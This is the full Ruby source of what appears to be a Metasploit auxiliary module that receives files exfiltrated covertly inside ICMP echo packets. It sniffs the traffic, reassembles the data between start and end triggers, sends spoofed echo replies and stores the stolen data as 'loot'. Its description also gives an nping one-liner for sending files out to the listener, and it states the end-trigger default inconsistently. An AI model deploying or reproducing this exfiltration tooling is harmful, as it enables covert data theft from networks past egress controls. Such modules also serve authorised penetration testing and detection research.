##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Capture
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'         => 'ICMP Exfiltration Service',
      'Description'  => %q{
        This module is designed to provide a server-side component to receive and store files
        exfiltrated over ICMP echo request packets.

        To use this module you will need to send an initial ICMP echo request containing the
        specific start trigger (defaults to '^BOF') this can be followed by the filename being sent (or
        a random filename can be assisnged). All data received from this source will automatically
        be added to the receive buffer until an ICMP echo request containing a specific end trigger
        (defaults to '^EOL') is received.

        Suggested Client:
        Data can be sent from the client using a variety of tools. One such example is nping (included
        with the NMAP suite of tools) - usage: nping --icmp 10.0.0.1 --data-string "BOFtest.txt" -c1
      },
      'Author'      => 'Chris John Riley',
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          # packetfu
          ['URL','https://github.com/todb/packetfu'],
          # nping
          ['URL', 'http://nmap.org/book/nping-man.html'],
          # simple icmp
          ['URL', 'http://blog.c22.cc/2012/02/17/quick-post-fun-with-python-ctypes-simpleicmp/']
        ]
    )

    register_options([
      OptString.new('START_TRIGGER', [true, 'Trigger for beginning of file', '^BOF']),
      OptString.new('END_TRIGGER',   [true, 'Trigger for end of file', '^EOF']),
      OptString.new('RESP_START',    [true, 'Data to respond when initial trigger matches', 'SEND']),
      OptString.new('RESP_CONT',     [true, 'Data ro resond when continuation of data expected', 'OK']),
      OptString.new('RESP_END',      [true, 'Data to response when EOF received and data saved', 'COMPLETE']),
      OptString.new('BPF_FILTER',    [true, 'BFP format filter to listen for', 'icmp']),
      OptString.new('INTERFACE',     [false, 'The name of the interface']),
      OptBool.new('FNAME_IN_PACKET', [true, 'Filename presented in first packet straight after START_TRIGGER', true])
    ], self.class)

    register_advanced_options([
      OptEnum.new('CLOAK',      [true, 'OS fingerprint to use for packet creation', 'linux', ['windows', 'linux', 'freebsd']]),
      OptBool.new('PROMISC',    [true, 'Enable/Disable promiscuous mode', false]),
      OptAddress.new('LOCALIP', [false, 'The IP address of the local interface'])
    ], self.class)

    deregister_options('SNAPLEN','FILTER','PCAPFILE','RHOST','UDP_SECRET','GATEWAY','NETMASK', 'TIMEOUT')
  end

  def run
    begin
      # check Pcaprub is up to date
      if not netifaces_implemented?
        print_error("WARNING : Pcaprub is not uptodate, some functionality will not be available")
        netifaces = false
      else
        netifaces = true
      end

      @interface = datastore['INTERFACE'] || Pcap.lookupdev
      # this is needed on windows cause we send interface directly to Pcap functions
      @interface = get_interface_guid(@interface)
      @iface_ip = datastore['LOCALIP']
      @iface_ip ||= Pcap.lookupaddrs(@interface)[0] if netifaces
      raise "Interface IP is not defined and can not be guessed" unless @iface_ip

      # start with blank slate
      @record = false
      @record_data = ''

      if datastore['PROMISC']
        print_status("Warning: Promiscuous mode enabled. This may cause issues!")
      end

      # start icmp listener process - loop
      icmp_listener

    ensure
      store_file
      print_status("\nStopping ICMP listener on #{@interface} (#{@iface_ip})")
    end
  end

  def icmp_listener
    # start icmp listener

    print_status("ICMP Listener started on #{@interface} (#{@iface_ip}). Monitoring for trigger packet containing #{datastore['START_TRIGGER']}")
    if datastore['FNAME_IN_PACKET']
      print_status("Filename expected in initial packet, directly following trigger (e.g. #{datastore['START_TRIGGER']}filename.ext)")
    end

    cap = PacketFu::Capture.new(
            :iface   => @interface,
            :start   => true,
            :filter  => datastore['BPF_FILTER'],
            :promisc => datastore['PROMISC']
            )
    loop {
      cap.stream.each do | pkt |
        packet = PacketFu::Packet.parse(pkt)
        data = packet.payload[4..-1]

        if packet.is_icmp? and data =~ /#{datastore['START_TRIGGER']}/
          # start of new file detected
          vprint_status("#{Time.now}: ICMP (type %d code %d) SRC:%s DST:%s" %
                [packet.icmp_type, packet.icmp_code, packet.ip_saddr, packet.ip_daddr])

          # detect and warn if system is responding to ICMP echo requests
          # suggested fixes:
          # -(linux) echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
          # -(Windows) netsh firewall set icmpsetting 8 disable
          # -(Windows) netsh firewall set opmode mode = ENABLE

          if packet.icmp_type == 0 and packet.icmp_code == 0 and packet.ip_saddr == @iface_ip
            print_error "Dectected ICMP echo response. You must either disable ICMP handling"
            print_error "or try a more restrictive BPF filter. You might try:"
            print_error " set BPF_FILTER icmp and not src #{datastore['LOCALIP']}"
            return
          end

          if @record
            print_error("New file started without saving old data")
            store_file
          end

          # begin recording stream
          @record = true
          @record_host = packet.ip_saddr
          @record_data = ''

          # set filename from data in incoming icmp packet
          if datastore['FNAME_IN_PACKET']
            @filename = data[((datastore['START_TRIGGER'].length)-1)..-1].strip
          end
          # if filename not sent in packet, or FNAME_IN_PACKET false set time based name
          if not datastore['FNAME_IN_PACKET'] or @filename.empty?
            @filename = "icmp_exfil_" + ::Time.now.to_i.to_s # set filename based on current time
          end

          print_good("Beginning capture of \"#{@filename}\" data")

          # create response packet icmp_pkt
          icmp_response, contents = icmp_packet(packet, datastore['RESP_START'])

          if not icmp_response
            raise RuntimeError ,"Could not build ICMP response"
          else
            # send response packet icmp_pkt
            send_icmp(icmp_response, contents)
          end

        elsif packet.is_icmp? and @record and @record_host == packet.ip_saddr
          # check for EOF marker, if not continue recording data

          if data =~ /#{datastore['END_TRIGGER']}/
            # end of file marker found
            print_status("#{@record_data.length} bytes of data recevied in total")
            print_good("End of File received. Saving \"#{@filename}\" to loot")
            store_file

            # create response packet icmp_pkt
            icmp_response, contents = icmp_packet(packet, datastore['RESP_END'])

            if not icmp_response
              raise RuntimeError , "Could not build ICMP response"
            else
              # send response packet icmp_pkt
              send_icmp(icmp_response, contents)
            end

            # turn off recording and clear status
            @record = false
            @record_host = ''
            @record_data = ''

          else
            # add data to recording and continue
            @record_data << data.to_s()
            vprint_status("Received #{data.length} bytes of data from #{packet.ip_saddr}")

            # create response packet icmp_pkt
            icmp_response, contents = icmp_packet(packet, datastore['RESP_CONT'])

            if not icmp_response
              raise RuntimeError , "Could not build ICMP response"
            else
              # send response packet icmp_pkt
              send_icmp(icmp_response, contents)
            end
          end
        end
      end
    }
  end

  def icmp_packet(packet, contents)
    # create icmp response

    @src_ip = packet.ip_daddr
    src_mac = packet.eth_daddr
    @dst_ip = packet.ip_saddr
    dst_mac = packet.eth_saddr
    icmp_id = packet.payload[0,2]
    icmp_seq = packet.payload[2,2]

    # create payload with matching id/seq
    resp_payload = icmp_id + icmp_seq + contents

    icmp_pkt = PacketFu::ICMPPacket.new(:flavor => datastore['CLOAK'].downcase)
    icmp_pkt.eth_saddr = src_mac
    icmp_pkt.eth_daddr = dst_mac
    icmp_pkt.icmp_type = 0
    icmp_pkt.icmp_code = 0
    icmp_pkt.payload = resp_payload
    icmp_pkt.ip_saddr = @src_ip
    icmp_pkt.ip_daddr = @dst_ip
    icmp_pkt.recalc

    icmp_response = icmp_pkt

    return icmp_response, contents
  end

  def send_icmp(icmp_response, contents)
    # send icmp response on selected interface
    icmp_response.to_w(iface = @interface)
    vprint_good("Response sent to #{@dst_ip} containing response trigger : \"#{contents}\"")
  end

  def store_file
    # store the file in loot if data is present
    if @record_data and not @record_data.empty?
      loot = store_loot(
          "icmp_exfil",
          "text/xml",
          @src_ip,
          @record_data,
          @filename,
          "ICMP Exfiltrated Data"
          )
      print_good("Incoming file \"#{@filename}\" saved to loot")
      print_good("Loot filename: #{loot}")
    end
  end
end
